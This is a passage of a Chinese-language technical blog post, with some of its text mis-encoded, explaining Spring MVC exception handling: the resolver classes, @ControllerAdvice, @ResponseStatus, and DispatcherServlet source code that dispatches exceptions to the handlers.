class="meta">@ExceptionHandler</span>(IOException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">ResponseEntity</span>&lt;<span class="title">String</span>&gt; <span class="title">handleIOException</span>(<span class="title">IOException</span> <span class="title">ex</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prepare responseEntity</span></span><br><span class="line">        <span class="keyword">return</span> responseEntity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¼‚å¸¸ç›¸å…³çš„ç±»"><a href="#å¼‚å¸¸ç›¸å…³çš„ç±»" class="headerlink" title="å¼‚å¸¸ç›¸å…³çš„ç±»"></a>å¼‚å¸¸ç›¸å…³çš„ç±»</h3><blockquote class="pullquote mindmap"><p>#Spring MVC Exception</p>
<p>##HandlerExceptionResolver</p>
<p>###SimpleMappingExceptionResolver</p>
<p>###DefaultHandlerExceptionResolver</p>
<p>##@ExceptionHandler</p>
<p>###@ControllerAdvice</p>
<p>###ResponseEntityExceptionHandler</p>
<p>##Default Servlet Container Error Page</p>
<p>##@ResponseStatus</p>
<p>###ResponseStatusExceptionResolver</p>
</blockquote>
<h3 id="SimpleMappingExceptionResolver"><a href="#SimpleMappingExceptionResolver" class="headerlink" title="SimpleMappingExceptionResolver"></a><code>SimpleMappingExceptionResolver</code></h3><blockquote>
<p>The SimpleMappingExceptionResolver enables you to take the<br>class name of any exception that might be thrown and map it to a view name. </p>
</blockquote>
<p>è¿™ä¸ªResolverå¯ä»¥å°†å¼‚å¸¸å¯¹åº”çš„ç±»åæ˜ å°„åˆ°ä¸€ä¸ªå¯¹åº”çš„view nameä¸Šã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.SimpleMappingExceptionResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"exceptionMappings"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"com.howtodoinjava.demo.exception.AuthException"</span>&gt;</span></span><br><span class="line">                error/authExceptionView</span><br><span class="line">            <span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultErrorView"</span> <span class="attr">value</span>=<span class="string">"error/genericView"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="DefaultHandlerExceptionResolver"><a href="#DefaultHandlerExceptionResolver" class="headerlink" title="DefaultHandlerExceptionResolver"></a><code>DefaultHandlerExceptionResolver</code></h3><blockquote>
<p>The DefaultHandlerExceptionResolver translates Spring MVC exceptions to specific error<br>status codes.</p>
</blockquote>
<p>è¿™ä¸ªResolverçš„ä½œç”¨å°±æ˜¯å°†Spring MVCäº§ç”Ÿçš„ä¸€äº›å¼‚å¸¸ç¿»è¯‘æˆå¯¹åº”çš„http status codeã€‚Spring MVCä¸­</p>
<p>é»˜è®¤æ³¨å†Œäº†è¿™ä¸ªResolverã€‚</p>
<p>è½¬æ¢åˆ—è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th>Exception</th>
<th>HTTP Status Code</th>
</tr>
</thead>
<tbody>
<tr>
<td>BindException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>ConversionNotSupportedException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>HttpMediaTypeNotAcceptableException</td>
<td>406 (Not Acceptable)</td>
</tr>
<tr>
<td>HttpMediaTypeNotSupportedException</td>
<td>415 (Unsupported Media Type)</td>
</tr>
<tr>
<td>HttpMessageNotReadableException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>HttpMessageNotWritableException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>HttpRequestMethodNotSupportedException</td>
<td>405 (Method Not Allowed)</td>
</tr>
<tr>
<td>MethodArgumentNotValidException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>MissingPathVariableException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>MissingServletRequestParameterException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>MissingServletRequestPartException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>NoHandlerFoundException</td>
<td>404 (Not Found)</td>
</tr>
<tr>
<td>NoSuchRequestHandlingMethodException</td>
<td>404 (Not Found)</td>
</tr>
</tbody>
</table>
<h3 id="ExceptionHandlerå’Œ-ControllerAdvice"><a href="#ExceptionHandlerå’Œ-ControllerAdvice" class="headerlink" title="@ExceptionHandlerå’Œ@ControllerAdvice"></a>@ExceptionHandlerå’Œ@ControllerAdvice</h3><p><code>@ExceptionHandler</code> å¯ä»¥æŒ‡å®šå¼‚å¸¸çš„å¤„ç†ç±»ï¼Œ<code>@ControllerAdvice</code>åˆ™å¯ä»¥å®ç°å…¨å±€çš„å¼‚å¸¸ç»Ÿä¸€å¤„ç†ã€‚</p>
<p>ä¸¤è€…å¯é…åˆä½¿ç”¨ï¼Œè¾¾åˆ°ç»Ÿä¸€å¤„ç†å¼‚å¸¸çš„æ•ˆæœã€‚</p>
<blockquote>
<p>The @ControllerAdvice annotation is a component annotation allowing implementation classes<br>to be auto-detected through classpath scanning. It is automatically enabled when using the MVC<br>namespace or the MVC Java config.</p>
</blockquote>
<p><code>@ControllerAdvice</code>é»˜è®¤åœ¨Spring MVCçš„å‘½åç©ºé—´ä¸­å¯ç”¨ã€‚</p>
<blockquote>
<p>Classes annotated with @ControllerAdvice can contain @ExceptionHandler, @InitBinder,<br>and @ModelAttribute annotated methods, and these methods will apply to @RequestMapping<br>methods across all controller hierarchies as opposed to the controller hierarchy within which they are<br>declared.</p>
</blockquote>
<p><code>@ControllerAdvice</code>å£°æ˜çš„å¼‚å¸¸å¤„ç†æ–¹æ³•é»˜è®¤å¯¹å…¨å±€éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Target all Controllers annotated with @RestController</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(annotations = RestController<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">AnnotationAdvice</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Target all Controllers within specific packages</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(<span class="string">"org.example.controllers"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasePackageAdvice</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Target all Controllers assignable to specific classes</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(assignableTypes = &#123;ControllerInterface<span class="class">.<span class="keyword">class</span>, <span class="title">AbstractController</span>.<span class="title">class</span>&#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">AssignableTypesAdvice</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€ä¸ª<code>@RestControllerAdvice</code>å’Œ<code>@ControllerAdvice</code>ç›¸ä¼¼ï¼Œåªæ˜¯å‡å®š<code>@ResponseBody</code>å‡ºç°åœ¨<code>@ExceptionHandler</code>ä¸Š</p>
<blockquote>
<p>@RestControllerAdvice is an alternative where @ExceptionHandler methods assume<br>@ResponseBody semantics by default.</p>
</blockquote>
<h3 id="ResponseEntityExceptionHandler"><a href="#ResponseEntityExceptionHandler" class="headerlink" title="ResponseEntityExceptionHandler"></a><code>ResponseEntityExceptionHandler</code></h3><p>å¦‚æœä½ æƒ³ä½¿ç”¨<code>@ExceptionHandler</code>æ¥å¤„ç†å¼‚å¸¸çš„è¯ï¼Œ ä½ å¯ä»¥ç»§æ‰¿è¿™ä¸ªç±»ã€‚</p>
<p>è¿™ä¸ªç±»ä¸­å®šä¹‰å¥½äº†ä¸€ä¸ªå¼‚å¸¸å¤„ç†çš„æ–¹æ³•ï¼Œæ¥å¤„ç†Spring MVC çš„æ ‡å‡†å¼‚å¸¸ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Provides handling for standard Spring MVC exceptions.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ex the target exception</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request the current request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(&#123;</span><br><span class="line">            NoSuchRequestHandlingMethodException<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpRequestMethodNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMediaTypeNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMediaTypeNotAcceptableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingPathVariableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingServletRequestParameterException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">ServletRequestBindingException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">ConversionNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">TypeMismatchException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMessageNotReadableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMessageNotWritableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MethodArgumentNotValidException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingServletRequestPartException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">BindException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">NoHandlerFoundException</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">        &#125;)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">final</span> <span class="title">ResponseEntity</span>&lt;<span class="title">Object</span>&gt; <span class="title">handleException</span>(<span class="title">Exception</span> <span class="title">ex</span>, <span class="title">WebRequest</span> <span class="title">request</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            HttpHeaders headers = <span class="keyword">new</span> HttpHeaders();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> NoSuchRequestHandlingMethodException) &#123;</span><br><span class="line">                HttpStatus status = HttpStatus.NOT_FOUND;</span><br><span class="line">                <span class="keyword">return</span> handleNoSuchRequestHandlingMethod((NoSuchRequestHandlingMethodException) ex, headers, status, request);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ResponseStatus"><a href="#ResponseStatus" class="headerlink" title="@ResponseStatus"></a>@ResponseStatus</h3><p>ç”¨äºåœ¨è‡ªå®šä¹‰å¼‚å¸¸ï¼Œè®¾ç½®httpçš„çŠ¶æ€ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseStatus</span>(value=HttpStatus.NOT_FOUND, reason=<span class="string">"No such Order"</span>)  <span class="comment">// 404</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNotFoundException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Spring MVC ä¸­é»˜è®¤å¼€å¯äº†<code>ResponseStatusExceptionResolver</code>ï¼Œè¿™ä¸ªResolverä¼šå¤„ç†ä¸Šé¢</p>
<p>è®¾ç½®çš„Http status codeã€‚</p>
<blockquote>
<p>A business exception can be annotated with @ResponseStatus. When the exception is raised, the<br>ResponseStatusExceptionResolver handles it by setting the status of the response accordingly.<br>By default the DispatcherServlet registers the ResponseStatusExceptionResolver and it is<br>available for use.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">doResolveException</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            Object handler, Exception ex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ResponseStatus responseStatus = AnnotatedElementUtils.findMergedAnnotation(ex.getClass(), ResponseStatus<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span> (responseStatus != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> resolveResponseStatus(responseStatus, request, response, handler, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception resolveEx) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Handling of @ResponseStatus resulted in Exception"</span>, resolveEx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ex.getCause() <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            ex = (Exception) ex.getCause();</span><br><span class="line">            <span class="keyword">return</span> doResolveException(request, response, handler, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å·¥å…·ç±»æ‹¿åˆ°æ³¨è§£ä¸Šçš„å€¼ï¼Œç„¶åè°ƒç”¨å†…éƒ¨çš„<code>resolveResponseStatus</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">resolveResponseStatus</span><span class="params">(ResponseStatus responseStatus, HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> statusCode = responseStatus.code().value();</span><br><span class="line">        String reason = responseStatus.reason();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.messageSource != <span class="keyword">null</span>) &#123;</span><br><span class="line">            reason = <span class="keyword">this</span>.messageSource.getMessage(reason, <span class="keyword">null</span>, reason, LocaleContextHolder.getLocale());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasLength(reason)) &#123;</span><br><span class="line">            response.sendError(statusCode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendError(statusCode, reason);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModelAndView();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆå°†http status code è®¾ç½®åˆ°reponseä¸­ã€‚</p>
<h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>Spring MVC çš„å¼‚å¸¸å¤„ç†åœ¨<code>DispatcherServlet</code>çš„<code>doDispatch</code>æ–¹æ³•ä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HttpServletRequest processedRequest = request;</span><br><span class="line">        HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">            Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//do Handle</span></span><br><span class="line">                ...</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                dispatchException = ex;</span><br><span class="line">            &#125;</span><br><span class="line">            processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">            triggerAfterCompletionWithError(processedRequest, response, mappedHandler, err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//post process</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨å†…å±‚çš„<code>try-catch</code>ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•<code>processDispatchResult</code>, åœ¨è¿™ä¸ªæ–¹æ³•ä¹‹å‰çš„catchå—å·²ç»å°†å¤„ç†è¿‡ç¨‹å¯èƒ½å‡ºç°çš„å¼‚å¸¸catchä½äº†ï¼Œå¹¶èµ‹å€¼ç»™ <code>dispatchException</code>.</p>
<p>ç„¶åè°ƒç”¨<code>processDispatchResult</code>åˆ†å‘ç»™èƒ½å¤„ç†è¿™ä¸ªå¼‚å¸¸çš„<code>ExceptionResolver</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the result of handler selection and handler invocation, which is</span></span><br><span class="line"><span class="comment">     * either a ModelAndView or an Exception to be resolved to a ModelAndView.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            HandlerExecutionChain mappedHandler, ModelAndView mv, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> errorView = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (exception != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">                logger.debug(<span class="string">"ModelAndViewDefiningException encountered"</span>, exception);</span><br><span class="line">                mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                Object handler = (mappedHandler != <span class="keyword">null</span> ? mappedHandler.getHandler() : <span class="keyword">null</span>);</span><br><span class="line">                mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">                errorView = (mv != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">        <span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">            render(mv, request, response);</span><br><span class="line">            <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">                WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Null ModelAndView returned to DispatcherServlet with name '"</span> + getServletName() +</span><br><span class="line">                        <span class="string">"': assuming HandlerAdapter completed request handling"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mappedHandler.triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">processHandlerException</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check registered HandlerExceptionResolvers...</span></span><br><span class="line">        ModelAndView exMv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (HandlerExceptionResolver handlerExceptionResolver : <span class="keyword">this</span>.handlerExceptionResolvers) &#123;</span><br><span class="line">            exMv = handlerExceptionResolver.resolveException(request, response, handler, ex);</span><br><span class="line">            <span class="keyword">if</span> (exMv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (exMv != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exMv.isEmpty()) &#123;</span><br><span class="line">                request.setAttribute(EXCEPTION_ATTRIBUTE, ex);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// We might still need view name translation for a plain error model...</span></span><br><span class="line">            <span class="keyword">if</span> (!exMv.hasView()) &#123;</span><br><span class="line">                exMv.setViewName(getDefaultViewName(request));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Handler execution resulted in exception - forwarding to resolved error view: "</span> + exMv, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            WebUtils.exposeErrorRequestAttributes(request, ex, getServletName());</span><br><span class="line">            <span class="keyword">return</span> exMv;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¼‚å¸¸çš„å¤„ç†å’Œä¹‹å‰ï¼ŒæŸ¥æ‰¾handlerçš„è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>éå†æ‰€æœ‰å·²ç»æ³¨å†Œçš„<code>HandlerExceptionResolver</code>, æ‰¾åˆ°ç¬¬ä¸€ä¸ªèƒ½å¤„ç†çš„ã€‚</p>
<h4 id="ExceptionHandlerçš„å¤„ç†"><a href="#ExceptionHandlerçš„å¤„ç†" class="headerlink" title="@ExceptionHandlerçš„å¤„ç†"></a>@ExceptionHandlerçš„å¤„ç†</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of the &#123;<span class="doctag">@link</span> org.springframework.web.portlet.HandlerExceptionResolver&#125; interface that handles</span></span><br><span class="line"><span class="comment"> * exceptions through the &#123;<span class="doctag">@link</span> ExceptionHandler&#125; annotation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span 